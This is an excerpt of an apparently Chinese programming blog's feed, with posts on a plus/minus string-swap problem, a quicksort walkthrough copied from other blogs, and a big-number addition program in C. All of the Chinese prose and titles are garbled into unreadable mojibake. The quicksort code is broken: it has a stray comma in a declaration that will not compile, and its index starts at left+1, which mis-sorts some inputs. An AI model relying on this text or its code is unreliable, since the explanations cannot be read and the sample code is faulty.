        <content type="html"><![CDATA[<h3 id="È¢òÁõÆÊèèËø∞"><a href="#È¢òÁõÆÊèèËø∞" class="headerlink" title="È¢òÁõÆÊèèËø∞"></a>È¢òÁõÆÊèèËø∞</h3><p>ShivaÂæóÂà∞‰∫Ü‰∏§‰∏™Âè™ÊúâÂä†Âè∑ÂíåÂáèÂè∑ÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÂ≠ó‰∏≤ÈïøÂ∫¶Áõ∏Âêå„ÄÇShiva‰∏ÄÊ¨°ÂèØ‰ª•Êää‰∏Ä‰∏™Âä†Âè∑ÂíåÂÆÉÁõ∏ÈÇªÁöÑÂáèÂè∑‰∫§Êç¢„ÄÇ‰ªñÊÉ≥Áü•ÈÅìÊúÄÂ∞ëÈúÄË¶ÅÂ§öÂ∞ëÊ¨°Êìç‰ΩúÊâçËÉΩÊääÁ¨¨‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÂèòÊç¢ÊàêÁ¨¨‰∫å‰∏™Â≠óÁ¨¶‰∏≤„ÄÇ‰Ω†Áé∞Âú®Ë¶ÅÂéªÂ∏ÆÂä©‰ªñÂÆåÊàêÈÇ£‰∏™Ëøô‰∏™ÈóÆÈ¢ò„ÄÇ</p><h3 id="ËæìÂÖ•"><a href="#ËæìÂÖ•" class="headerlink" title="ËæìÂÖ•"></a>ËæìÂÖ•</h3><p>Â§öÁªÑÊµãËØïÊï∞ÊçÆ  </p><p>ÊØèÁªÑÊï∞ÊçÆÊúâ‰∏§Ë°åÔºåÊØèË°åÂåÖÂê´‰∏Ä‰∏™Áî±‚Äù+‚ÄùÂíå‚Äù-‚ÄúÊúÄÊàêÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇÊØè‰∏™Â≠êÁ¨¶‰∏≤ÈïøÂ∫¶‰∏çË∂ÖËøá5000„ÄÇ</p><h3 id="ËæìÂá∫"><a href="#ËæìÂá∫" class="headerlink" title="ËæìÂá∫"></a>ËæìÂá∫</h3><p>‰ªÖ‰∏Ä‰∏™Êï¥Êï∞ÔºåËæìÂá∫ÊúÄÂ∞ëÈúÄË¶ÅÊìç‰ΩúÁöÑÊ¨°Êï∞„ÄÇÂ¶ÇÊûúÁ≠îÊ°à‰∏çÂ≠òÂú®ÔºåËæìÂá∫-1„ÄÇ</p><h3 id="Ê†∑‰æãËæìÂÖ•"><a href="#Ê†∑‰æãËæìÂÖ•" class="headerlink" title="Ê†∑‰æãËæìÂÖ•"></a>Ê†∑‰æãËæìÂÖ•</h3><pre><code>++-+--+ -++--++ </code></pre><h3 id="Ê†∑‰æãËæìÂá∫"><a href="#Ê†∑‰æãËæìÂá∫" class="headerlink" title="Ê†∑‰æãËæìÂá∫"></a>Ê†∑‰æãËæìÂá∫</h3><p>4</p><p>ÊÄùË∑ØÔºöÂ§ßÂæ™ÁéØÔºåÈÄöËøáÈÅçÂéÜstr1ÔºåÊØîËæÉstr2Ôºå</p><p>1.str1[i]==str2[i],ÂêëÂêéÈÅçÂéÜ</p><p>2.str1[i]!=str2[i],ÈÄöËøáj=i+1ÈÅçÂéÜstr2,ÂàÜ‰∏∫‰∏§Áßçfirst<br>str1[i]==str2[j],Â∞Üstr2[j]=str2[i];ËµãÂÄºÂç≥ÂèØ second<br>j=len,‰∏çÊª°Ë∂≥ÔºåÊ≤°ÊúâÊâæÂà∞str1[i]Ëøô‰∏™Â≠óÁ¨¶Ôºåcount=-1ÔºåbreakÔºõ</p><pre><code>#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(){    char str1[5001],str2[5001],temp;    int len,i,j,k,count;    while(scanf(&quot;%s%s&quot;,str1,str2)!=EOF)    {        count=0;        len=strlen(str1);        for(i=0;i&lt;len;i++)        {            if(str1[i]!=str2[i])            {                for(j=i+1;j&lt;len;j++)                    if(str1[i]==str2[j])                    {                        break;                                            }                if(j==len)                {                    count=-1;                    break;                }                count+=(j-i);                str2[j]=str2[i];                }        }        printf(&quot;%d\n&quot;,count);    }    return 0;    }</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Âø´ÈÄüÊéíÂ∫è</title>
      <link href="/2016/06/30/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/"/>
      <url>/2016/06/30/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p>Âø´ÈÄüÊéíÂ∫èÔºöÈááÁî®ÂàÜÊ≤ªÊÄùÊÉ≥<br>1.ÂàÜÊ≤ªÊÄùÊÉ≥ÔºöÂàÜÊ≤ªÁÆóÊ≥ïÁöÑÂü∫Êú¨ÊÄùÊÉ≥ÊòØÂ∞Ü‰∏Ä‰∏™ËßÑÊ®°‰∏∫NÁöÑÈóÆÈ¢òÂàÜËß£‰∏∫K‰∏™ËßÑÊ®°ËæÉÂ∞èÁöÑÂ≠êÈóÆÈ¢òÔºåËøô‰∫õÂ≠êÈóÆÈ¢òÁõ∏‰∫íÁã¨Á´ã‰∏î‰∏éÂéüÈóÆÈ¢òÊÄßË¥®Áõ∏Âêå„ÄÇÊ±ÇÂá∫Â≠êÈóÆÈ¢òÁöÑËß£ÔºåÂ∞±ÂèØÂæóÂà∞ÂéüÈóÆÈ¢òÁöÑËß£„ÄÇÂç≥‰∏ÄÁßçÂàÜÁõÆÊ†áÂÆåÊàêÁ®ãÂ∫èÁÆóÊ≥ïÔºåÁÆÄÂçïÈóÆÈ¢òÂèØÁî®‰∫åÂàÜÊ≥ïÂÆåÊàê„ÄÇ</p><hr><p>Êàë‰ª¨Áé∞Âú®ÂØπ‚Äú6 1 2 7 9 3 4 5 10 8‚ÄùËøô‰∏™10‰∏™Êï∞ËøõË°åÊéíÂ∫è<br>ÊñπÊ≥ïÂÖ∂ÂÆûÂæàÁÆÄÂçïÔºöÂàÜÂà´‰ªéÂàùÂßãÂ∫èÂàó‚Äú6 1 2 7 9 3 4 5 10<br>8‚Äù‰∏§Á´ØÂºÄÂßã‚ÄúÊé¢Êµã‚Äù„ÄÇÂÖà‰ªéÂè≥ÂæÄÂ∑¶Êâæ‰∏Ä‰∏™Â∞è‰∫é6ÁöÑÊï∞ÔºåÂÜç‰ªéÂ∑¶ÂæÄÂè≥Êâæ‰∏Ä‰∏™Â§ß‰∫é6ÁöÑÊï∞ÔºåÁÑ∂Âêé‰∫§Êç¢‰ªñ‰ª¨„ÄÇËøôÈáåÂèØ‰ª•Áî®‰∏§‰∏™ÂèòÈáèiÂíåjÔºåÂàÜÂà´ÊåáÂêëÂ∫èÂàóÊúÄÂ∑¶ËæπÂíåÊúÄÂè≥Ëæπ„ÄÇÊàë‰ª¨‰∏∫Ëøô‰∏§‰∏™ÂèòÈáèËµ∑‰∏™Â•ΩÂê¨ÁöÑÂêçÂ≠ó‚ÄúÂì®ÂÖµi‚ÄùÂíå‚ÄúÂì®ÂÖµj‚Äù„ÄÇÂàöÂºÄÂßãÁöÑÊó∂ÂÄôËÆ©Âì®ÂÖµiÊåáÂêëÂ∫èÂàóÁöÑÊúÄÂ∑¶ËæπÔºàÂç≥i=1ÔºâÔºåÊåáÂêëÊï∞Â≠ó6„ÄÇËÆ©Âì®ÂÖµjÊåáÂêëÂ∫èÂàóÁöÑÊúÄÂè≥ËæπÔºàÂç≥j=10ÔºâÔºåÊåáÂêëÊï∞Â≠ó8„ÄÇ<br><img src="http://bbs.ahalei.com/data/attachment/forum/201402/26/094811yilrz1tkzkvlrriz.png" alt="094811yilrz1tkzkvlrriz.png"></p><pre><code>È¶ñÂÖàÂì®ÂÖµjÂºÄÂßãÂá∫Âä®„ÄÇÂõ†‰∏∫Ê≠§Â§ÑËÆæÁΩÆÁöÑÂü∫ÂáÜÊï∞ÊòØÊúÄÂ∑¶ËæπÁöÑÊï∞ÔºåÊâÄ‰ª•ÈúÄË¶ÅËÆ©Âì®ÂÖµjÂÖàÂá∫Âä®ÔºåËøô‰∏ÄÁÇπÈùûÂ∏∏ÈáçË¶ÅÔºàËØ∑Ëá™Â∑±ÊÉ≥‰∏ÄÊÉ≥‰∏∫‰ªÄ‰πàÔºâ„ÄÇÂì®ÂÖµj‰∏ÄÊ≠•‰∏ÄÊ≠•Âú∞ÂêëÂ∑¶Êå™Âä®ÔºàÂç≥j--ÔºâÔºåÁõ¥Âà∞ÊâæÂà∞‰∏Ä‰∏™Â∞è‰∫é6ÁöÑÊï∞ÂÅú‰∏ãÊù•„ÄÇÊé•‰∏ãÊù•Âì®ÂÖµiÂÜç‰∏ÄÊ≠•‰∏ÄÊ≠•ÂêëÂè≥Êå™Âä®ÔºàÂç≥i++ÔºâÔºåÁõ¥Âà∞ÊâæÂà∞‰∏Ä‰∏™Êï∞Â§ß‰∫é6ÁöÑÊï∞ÂÅú‰∏ãÊù•„ÄÇÊúÄÂêéÂì®ÂÖµjÂÅúÂú®‰∫ÜÊï∞Â≠ó5Èù¢ÂâçÔºåÂì®ÂÖµiÂÅúÂú®‰∫ÜÊï∞Â≠ó7Èù¢Ââç„ÄÇ</code></pre><p><img src="http://bbs.ahalei.com/data/attachment/forum/201402/26/095430axy0qkhxxkktkktk.png" alt="095430axy0qkhxxkktkktk.png"></p><p><img src="http://bbs.ahalei.com/data/attachment/forum/201402/26/095437kdandfxhbtokk2qh.png" alt="095437kdandfxhbtokk2qh.png"></p><pre><code>Áé∞Âú®‰∫§Êç¢Âì®ÂÖµiÂíåÂì®ÂÖµjÊâÄÊåáÂêëÁöÑÂÖÉÁ¥†ÁöÑÂÄº„ÄÇ‰∫§Êç¢‰πãÂêéÁöÑÂ∫èÂàóÂ¶Ç‰∏ã„ÄÇ 6  1  2  5  9 3  4  7  10  8</code></pre><p><img src="http://bbs.ahalei.com/data/attachment/forum/201402/26/095448k1kevwlz41373e7k.png" alt="095448k1kevwlz41373e7k.png"></p><p><img src="http://bbs.ahalei.com/data/attachment/forum/201402/26/095458ejza15wscjv7iw5c.png" alt="095458ejza15wscjv7iw5c.png"></p><pre><code>Âà∞Ê≠§ÔºåÁ¨¨‰∏ÄÊ¨°‰∫§Êç¢ÁªìÊùü„ÄÇÊé•‰∏ãÊù•ÂºÄÂßãÂì®ÂÖµjÁªßÁª≠ÂêëÂ∑¶Êå™Âä®ÔºàÂÜçÂèãÊÉÖÊèêÈÜíÔºåÊØèÊ¨°ÂøÖÈ°ªÊòØÂì®ÂÖµjÂÖàÂá∫ÂèëÔºâ„ÄÇ‰ªñÂèëÁé∞‰∫Ü4ÔºàÊØîÂü∫ÂáÜÊï∞6Ë¶ÅÂ∞èÔºåÊª°Ë∂≥Ë¶ÅÊ±ÇÔºâ‰πãÂêéÂÅú‰∫Ü‰∏ãÊù•„ÄÇÂì®ÂÖµi‰πüÁªßÁª≠ÂêëÂè≥Êå™Âä®ÁöÑÔºå‰ªñÂèëÁé∞‰∫Ü9ÔºàÊØîÂü∫ÂáÜÊï∞6Ë¶ÅÂ§ßÔºåÊª°Ë∂≥Ë¶ÅÊ±ÇÔºâ‰πãÂêéÂÅú‰∫Ü‰∏ãÊù•„ÄÇÊ≠§Êó∂ÂÜçÊ¨°ËøõË°å‰∫§Êç¢Ôºå‰∫§Êç¢‰πãÂêéÁöÑÂ∫èÂàóÂ¶Ç‰∏ã„ÄÇ6  1  2 5  4  3  9  7 10  8Á¨¨‰∫åÊ¨°‰∫§Êç¢ÁªìÊùüÔºå‚ÄúÊé¢Êµã‚ÄùÁªßÁª≠„ÄÇÂì®ÂÖµjÁªßÁª≠ÂêëÂ∑¶Êå™Âä®Ôºå‰ªñÂèëÁé∞‰∫Ü3ÔºàÊØîÂü∫ÂáÜÊï∞6Ë¶ÅÂ∞èÔºåÊª°Ë∂≥Ë¶ÅÊ±ÇÔºâ‰πãÂêéÂèàÂÅú‰∫Ü‰∏ãÊù•„ÄÇÂì®ÂÖµiÁªßÁª≠ÂêëÂè≥ÁßªÂä®ÔºåÁ≥üÂï¶ÔºÅÊ≠§Êó∂Âì®ÂÖµiÂíåÂì®ÂÖµjÁõ∏ÈÅá‰∫ÜÔºåÂì®ÂÖµiÂíåÂì®ÂÖµjÈÉΩËµ∞Âà∞3Èù¢Ââç„ÄÇËØ¥ÊòéÊ≠§Êó∂‚ÄúÊé¢Êµã‚ÄùÁªìÊùü„ÄÇÊàë‰ª¨Â∞ÜÂü∫ÂáÜÊï∞6Âíå3ËøõË°å‰∫§Êç¢„ÄÇ‰∫§Êç¢‰πãÂêéÁöÑÂ∫èÂàóÂ¶Ç‰∏ã„ÄÇ</code></pre><p>3 1 2 5 4 6 9 7 10 8<br><img src="http://bbs.ahalei.com/data/attachment/forum/201402/26/095506uz7e1uuukcblhkxv.png" alt="095506uz7e1uuukcblhkxv.png"></p><p><img src="http://bbs.ahalei.com/data/attachment/forum/201402/26/095514cag5fumuqqg5jnsw.png" alt="095514cag5fumuqqg5jnsw.png"></p><p><img src="http://bbs.ahalei.com/data/attachment/forum/201402/26/095530e0jf6p0y6aaaw2ir.png" alt="095530e0jf6p0y6aaaw2ir.png"><br>„ÄÅ<br>Âà∞Ê≠§Á¨¨‰∏ÄËΩÆ‚ÄúÊé¢Êµã‚ÄùÁúüÊ≠£ÁªìÊùü„ÄÇÊ≠§Êó∂‰ª•Âü∫ÂáÜÊï∞6‰∏∫ÂàÜÁïåÁÇπÔºå6Â∑¶ËæπÁöÑÊï∞ÈÉΩÂ∞è‰∫éÁ≠â‰∫é6Ôºå6Âè≥ËæπÁöÑÊï∞ÈÉΩÂ§ß‰∫éÁ≠â‰∫é6„ÄÇÂõûÈ°æ‰∏Ä‰∏ãÂàöÊâçÁöÑËøáÁ®ãÔºåÂÖ∂ÂÆûÂì®ÂÖµjÁöÑ‰ΩøÂëΩÂ∞±ÊòØË¶ÅÊâæÂ∞è‰∫éÂü∫ÂáÜÊï∞ÁöÑÊï∞ÔºåËÄåÂì®ÂÖµiÁöÑ‰ΩøÂëΩÂ∞±ÊòØË¶ÅÊâæÂ§ß‰∫éÂü∫ÂáÜÊï∞ÁöÑÊï∞ÔºåÁõ¥Âà∞iÂíåjÁ¢∞Â§¥‰∏∫Ê≠¢„ÄÇ</p><pre><code>OKÔºåËß£ÈáäÂÆåÊØï„ÄÇÁé∞Âú®Âü∫ÂáÜÊï∞6Â∑≤ÁªèÂΩí‰ΩçÔºåÂÆÉÊ≠£Â•ΩÂ§ÑÂú®Â∫èÂàóÁöÑÁ¨¨6‰Ωç„ÄÇÊ≠§Êó∂Êàë‰ª¨Â∑≤ÁªèÂ∞ÜÂéüÊù•ÁöÑÂ∫èÂàóÔºå‰ª•6‰∏∫ÂàÜÁïåÁÇπÊãÜÂàÜÊàê‰∫Ü‰∏§‰∏™Â∫èÂàóÔºåÂ∑¶ËæπÁöÑÂ∫èÂàóÊòØ‚Äú3  1 2  5  4‚ÄùÔºåÂè≥ËæπÁöÑÂ∫èÂàóÊòØ‚Äú9  7  10  8‚Äù„ÄÇÊé•‰∏ãÊù•ËøòÈúÄË¶ÅÂàÜÂà´Â§ÑÁêÜËøô‰∏§‰∏™Â∫èÂàó„ÄÇÂõ†‰∏∫6Â∑¶ËæπÂíåÂè≥ËæπÁöÑÂ∫èÂàóÁõÆÂâçÈÉΩËøòÊòØÂæàÊ∑∑‰π±ÁöÑ„ÄÇ‰∏çËøá‰∏çË¶ÅÁ¥ßÔºåÊàë‰ª¨Â∑≤ÁªèÊéåÊè°‰∫ÜÊñπÊ≥ïÔºåÊé•‰∏ãÊù•Âè™Ë¶ÅÊ®°ÊãüÂàöÊâçÁöÑÊñπÊ≥ïÂàÜÂà´Â§ÑÁêÜ6Â∑¶ËæπÂíåÂè≥ËæπÁöÑÂ∫èÂàóÂç≥ÂèØ„ÄÇÁé∞Âú®ÂÖàÊù•Â§ÑÁêÜ6Â∑¶ËæπÁöÑÂ∫èÂàóÁé∞Âêß„ÄÇÂ∑¶ËæπÁöÑÂ∫èÂàóÊòØ‚Äú3  1  2 5  4‚Äù„ÄÇËØ∑Â∞ÜËøô‰∏™Â∫èÂàó‰ª•3‰∏∫Âü∫ÂáÜÊï∞ËøõË°åË∞ÉÊï¥Ôºå‰ΩøÂæó3Â∑¶ËæπÁöÑÊï∞ÈÉΩÂ∞è‰∫éÁ≠â‰∫é3Ôºå3Âè≥ËæπÁöÑÊï∞ÈÉΩÂ§ß‰∫éÁ≠â‰∫é3„ÄÇÂ•Ω‰∫ÜÂºÄÂßãÂä®Á¨îÂêß„ÄÇÂ¶ÇÊûú‰Ω†Ê®°ÊãüÁöÑÊ≤°ÊúâÈîôÔºåË∞ÉÊï¥ÂÆåÊØï‰πãÂêéÁöÑÂ∫èÂàóÁöÑÈ°∫Â∫èÂ∫îËØ•ÊòØ„ÄÇ2  1  3  5  4OKÔºåÁé∞Âú®3Â∑≤ÁªèÂΩí‰Ωç„ÄÇÊé•‰∏ãÊù•ÈúÄË¶ÅÂ§ÑÁêÜ3Â∑¶ËæπÁöÑÂ∫èÂàó‚Äú2 1‚ÄùÂíåÂè≥ËæπÁöÑÂ∫èÂàó‚Äú5 4‚Äù„ÄÇÂØπÂ∫èÂàó‚Äú2 1‚Äù‰ª•2‰∏∫Âü∫ÂáÜÊï∞ËøõË°åË∞ÉÊï¥ÔºåÂ§ÑÁêÜÂÆåÊØï‰πãÂêéÁöÑÂ∫èÂàó‰∏∫‚Äú1 2‚ÄùÔºåÂà∞Ê≠§2Â∑≤ÁªèÂΩí‰Ωç„ÄÇÂ∫èÂàó‚Äú1‚ÄùÂè™Êúâ‰∏Ä‰∏™Êï∞Ôºå‰πü‰∏çÈúÄË¶ÅËøõË°å‰ªª‰ΩïÂ§ÑÁêÜ„ÄÇËá≥Ê≠§Êàë‰ª¨ÂØπÂ∫èÂàó‚Äú2 1‚ÄùÂ∑≤ÂÖ®ÈÉ®Â§ÑÁêÜÂÆåÊØïÔºåÂæóÂà∞Â∫èÂàóÊòØ‚Äú1 2‚Äù„ÄÇÂ∫èÂàó‚Äú5 4‚ÄùÁöÑÂ§ÑÁêÜ‰πü‰ªøÁÖßÊ≠§ÊñπÊ≥ïÔºåÊúÄÂêéÂæóÂà∞ÁöÑÂ∫èÂàóÂ¶Ç‰∏ã„ÄÇ1  2  3 4  5  6 9  7  10  8ÂØπ‰∫éÂ∫èÂàó‚Äú9  7  10  8‚Äù‰πüÊ®°ÊãüÂàöÊâçÁöÑËøáÁ®ãÔºåÁõ¥Âà∞‰∏çÂèØÊãÜÂàÜÂá∫Êñ∞ÁöÑÂ≠êÂ∫èÂàó‰∏∫Ê≠¢„ÄÇÊúÄÁªàÂ∞Ü‰ºöÂæóÂà∞ËøôÊ†∑ÁöÑÂ∫èÂàóÔºåÂ¶Ç‰∏ã„ÄÇ1  2  3 4  5  6  7  8 9  10Âà∞Ê≠§ÔºåÊéíÂ∫èÂÆåÂÖ®ÁªìÊùü„ÄÇÁªÜÂøÉÁöÑÂêåÂ≠¶ÂèØËÉΩÂ∑≤ÁªèÂèëÁé∞ÔºåÂø´ÈÄüÊéíÂ∫èÁöÑÊØè‰∏ÄËΩÆÂ§ÑÁêÜÂÖ∂ÂÆûÂ∞±ÊòØÂ∞ÜËøô‰∏ÄËΩÆÁöÑÂü∫ÂáÜÊï∞ÂΩí‰ΩçÔºåÁõ¥Âà∞ÊâÄÊúâÁöÑÊï∞ÈÉΩÂΩí‰Ωç‰∏∫Ê≠¢ÔºåÊéíÂ∫èÂ∞±ÁªìÊùü‰∫Ü„ÄÇ‰∏ãÈù¢‰∏ä‰∏™Èú∏Ê∞îÁöÑÂõæÊù•ÊèèËø∞‰∏ãÊï¥‰∏™ÁÆóÊ≥ïÁöÑÂ§ÑÁêÜËøáÁ®ã„ÄÇ</code></pre><p><img src="http://bbs.ahalei.com/data/attachment/forum/201402/25/232129ogop8gk0r8y7l70k.png" alt="232129ogop8gk0r8y7l70k.png"></p><h2 id="‰ª•‰∏äËΩ¨Ëá™-http-ahalei-blog-51cto-com-4767671-1365285"><a href="#‰ª•‰∏äËΩ¨Ëá™-http-ahalei-blog-51cto-com-4767671-1365285" class="headerlink" title="‰ª•‰∏äËΩ¨Ëá™ [ http://ahalei.blog.51cto.com/4767671/1365285"></a>‰ª•‰∏äËΩ¨Ëá™ [ <a href="http://ahalei.blog.51cto.com/4767671/1365285" target="_blank" rel="noopener">http://ahalei.blog.51cto.com/4767671/1365285</a></h2><p>](<a href="http://ahalei.blog.51cto.com/4767671/1365285" target="_blank" rel="noopener">http://ahalei.blog.51cto.com/4767671/1365285</a>) ÂÜôÁöÑÈùûÂ∏∏Â•Ω</p><p>3.ÂÖ≥‰∫éÂø´ÈÄüÊéíÂ∫èÊ≥ï‰∏∫‰ªÄ‰πà‰∏ÄÂÆöË¶Å‰ªéÂè≥ËæπÂºÄÂßãÁöÑÂéüÂõ†</p><pre><code>while(a[i]&lt;a[left]&amp;&amp;i&lt;j)            i++;        while(a[j]&gt;a[left]&amp;&amp;i&lt;j)            j--;</code></pre><p>ËøôÈáå‰∏§‰∏™whileÁöÑÈ°∫Â∫èÊòØ‰∏çËÉΩÊîπÂèòÁöÑÔºåÊÉ≥‰∏ÄÊÉ≥Ôºö<br>ÂÅáËÆæÂØπÂ¶Ç‰∏ãËøõË°åÊéíÂ∫èÔºö<br><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373936.69132459598.png" alt="‰æã"><br>Â¶Ç‰∏äÂõæÔºå6Âú®Â∑¶Ôºå9Âú®Âè≥ Êàë‰ª¨Â∞Ü6‰Ωú‰∏∫Âü∫Êï∞„ÄÇ<br>ÂÅáËÆæ‰ªéÂ∑¶ËæπÂºÄÂßãÔºà‰∏éÊ≠£Á°ÆÁ®ãÂ∫èÊ≠£Â•ΩÁõ∏ÂèçÔºâ<br>‰∫éÊòØi Â∞±‰ºöÁßªÂä®Âà∞Áé∞Âú®ÁöÑ Êï∞Â≠ó 7 ÈÇ£‰∏™‰ΩçÁΩÆÂÅú‰∏ãÊù•ÔºåËÄå j ÂéüÊù•Âú® Êï∞Â≠ó 9 ÈÇ£‰∏™‰ΩçÁΩÆ ÔºåÂõ†‰∏∫</p><pre><code>while(arr[j]&gt;=temp&amp;&amp;i&lt;j)‰∫éÊòØÔºåj ‰πü‰ºöÂÅúÁïôÂú®Êï∞Â≠ó7 ÈÇ£‰∏™‰ΩçÁΩÆÔºå‰∫éÊòØÈóÆÈ¢òÊù•‰∫Ü„ÄÇÂΩì‰Ω†ÊúÄÂêé‰∫§Êç¢Âü∫Êï∞6‰∏é7Êó∂Ôºå‰∏çÂØπÂëÄÔºÅÔºÅ„ÄÇÈóÆÈ¢òÂú®‰∫éÂΩìÊàë‰ª¨ÂÖà‰ªéÂú®ËæπÂºÄÂßãÊó∂ÔºåÈÇ£‰πà i ÊâÄÂÅúÁïôÁöÑÈÇ£‰∏™‰ΩçÁΩÆËÇØÂÆöÊòØÂ§ß‰∫éÂü∫Êï∞6ÁöÑÔºåËÄåÂú®‰∏äËø∞‰æãÂ≠ê‰∏≠Ôºå‰∏∫‰∫ÜÊª°Ë∂≥ i&lt;j ‰∫éÊòØ j‰πüÂÅúÁïôÂú®7ÁöÑ‰ΩçÁΩÆ‰ΩÜÊúÄÂêé‰∫§Êç¢ÂõûÂéªÁöÑÊó∂ÂÄôÔºå7Â∞±Âà∞‰∫ÜÂ∑¶ËæπÔºå‰∏çË°åÔºåÂõ†‰∏∫Êàë‰ª¨ÂéüÊú¨‰∫§Êç¢ÂêéÊï∞Â≠ó6Âú®ËæπÂ∫îËØ•ÊòØÂÖ®ÈÉ®Â∞è‰∫é6ÔºåÂè≥ËæπÂÖ®ÈÉ®Â§ß‰∫é6.‰ΩÜÁé∞Âú®‰∏çË°å‰∫Ü„ÄÇ‰∫éÊòØÔºåÊàë‰ª¨ÂøÖÈ°ª‰ªéÂè≥ËæπÂºÄÂßãÔºå‰πüÂ∞±ÊòØ‰ªéÂü∫Êï∞ÁöÑÂØπÈù¢ÂºÄÂßã„ÄÇ</code></pre><hr><p>ËΩ¨Ëá™ <a href="http://blog.csdn.net/w282529350/article/details/50982650" target="_blank" rel="noopener"> http://blog.csdn.net/w282529350/article/details/50982650</a></p><pre><code>‰∏úÊãºË•øÂáëÊäÑÂ•ΩÁöÑÔºå‰∏ãÈù¢Ëá™Â∑±Ê®°‰ªøÂà´‰∫∫ÁöÑÂø´ÈÄüÊéíÂ∫è</code></pre><p>ËøôÈáåÂÜô‰ª£Á†ÅÁâá</p><pre><code>#include &lt;stdio.h&gt;void QuickSort(int a[],int left,int right){    int i=left+1,j=right,temp,;    if(left&gt;=right)        return;    while(i!=j)    {        while(a[j]&gt;a[left]&amp;&amp;i&lt;j)            j--;        while(a[i]&lt;a[left]&amp;&amp;i&lt;j)            i++;        if(i&lt;j)            {                temp=a[i];a[i]=a[j];a[j]=temp;            }    }    temp=a[left];a[left]=a[j];a[j]=temp;    QuickSort(a,left,i-1);    QuickSort(a,i+1,right);}int main(){    int a[]={6,1,2,7,9,3,4,5,10,8},i;       QuickSort(a,0,sizeof(a)/sizeof(int)-1);    for(i=0;i&lt;10;i++)        printf(&quot;%d\t&quot;,a[i]);    return 0;}</code></pre><p>markdownÁºñËæëÂ•Ω‰∏çËàíÊúç</p>]]></content>
      
      
      
        <tags>
            
            <tag> ÁÆóÊ≥ï </tag>
            
            <tag> Âø´ÈÄüÊéíÂ∫è </tag>
            
            <tag> ÂàÜÊ≤ªÁÆóÊ≥ï </tag>
            
            <tag> ÊéíÂ∫è </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A + B Problem IIÔºàÈ´òÁ≤æÂ∫¶Âä†Ê≥ïÔºâ</title>
      <link href="/2016/06/24/A%20+%20B%20Problem%20II%EF%BC%88%E9%AB%98%E7%B2%BE%E5%BA%A6%E5%8A%A0%E6%B3%95%EF%BC%89/"/>
      <url>/2016/06/24/A%20+%20B%20Problem%20II%EF%BC%88%E9%AB%98%E7%B2%BE%E5%BA%A6%E5%8A%A0%E6%B3%95%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<pre><code>#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(){    int lenmax,la,lb,k,i,n,len,lenmin,l=1;    char a[1000];    char b[1000];    char sum[1000];    char ch;    scanf(&quot;%d&quot;,&amp;n);    getchar();    while(n--)    {        scanf(&quot;%s&quot;,&amp;a);        scanf(&quot;%s&quot;,&amp;b);//ËæìÂÖ•aÂíåb//Â••Ê≥®ÊÑèËæìÂÖ•Êó∂y        la=strlen(a)-1;        lb=strlen(b)-1;        lenmax=(la&gt;lb?la:lb);        lenmin=(la&lt;lb)?la:lb;        for(i=0;i&lt;=lenmax+1;i++)//Â∞Ü0‰ΩçÁΩÆÁïôÂá∫Êù•ÔºåÈò≤Ê≠¢Ë∂ä‰ΩçÔºå‰∏ÄÂÖ±len+1‰Ωç            sum[i]=&apos;0&apos;;        //ÂºÄÂßãËÆ°ÁÆó        //ËÆ°ÁÆóÂàÜ2Á±ª,‰∏ÄÁ±ªla==lb,‰∫åÁ±ªla&gt;lbÊàñla&lt;lb        for(i=lenmax+1;lenmin!=-1;i--)//ÂÜôÁõ∏ÂêåÁöÑÈÉ®ÂàÜÔºå‰ªéÂêéÂæÄÂâçÔºåË¶ÅÈò≤Ê≠¢Ëøõ‰Ωç        {            if(sum[i]+a[la]+b[lb]&gt;=154)//154ÊòØ‰∏â‰∏™Êï∞Âä†Ëµ∑Êù•Á≠â‰∫é10Êó∂ÁöÑascllÁöÑÂíåÔºåÂ¶Ç1+4+5=49+52+53=154            {                sum[i]=sum[i]+a[la--]+b[lb--]-106;//106ÊòØÈÄöËøá1+9+1-10=1=49=Ôºà49+57+49Ôºâ-106                sum[i-1]=&apos;1&apos;;            }            else            {                sum[i]=a[la--]+b[lb--]+sum[i]-96;                }            lenmin--;        }        /*‰ª•‰∏ä‰∏∫‰∏§‰∏™Êï∞Â≠óÁõ∏ÂêåÁöÑÊú´‰ΩçÔºå‰∏ãÈù¢ÂºÄÂßãËÆ®ËÆ∫Â¶ÇÊûúÊúâÂâ©‰Ωô*/        if(la&lt;0)        {            for(k=i;k&gt;=1;k--)            {                if(sum[k]+b[lb]&gt;=106)                {                    sum[k]=sum[k]+b[lb--]-58;//1+9=10=49+57-58=48                    sum[k-1]=&apos;1&apos;;                }                else                {                    sum[k]=b[lb--]+sum[k]-48;//1+0-x=1=49+48-48=49                }            }        }        else        {            for(k=i;k&gt;=1;k--)            {                if(sum[k]+a[la]&gt;=106)                {                    sum[k]=sum[k]+a[la--]-58;//1+9=10=49+57-58=48                    sum[k-1]=&apos;1&apos;;                }                else                {                    sum[k]=a[la--]+sum[k]-48;                }            }        }        //ÊâìÂç∞sumÊï∞ÁªÑ        printf(&quot;Case %d:\n%s + %s = &quot;,l,a,b);        if(sum[0]&gt;&apos;0&apos;&amp;&amp;sum[0]&lt;=&apos;9&apos;)        {            printf(&quot;%c&quot;,sum[0]);        }        for(k=1;k&lt;=lenmax+1;k++)            printf(&quot;%c&quot;,sum[k]);        printf(&quot;\n&quot;);        l++;        if(n)printf(&quot;\n&quot;);    }    return 0; 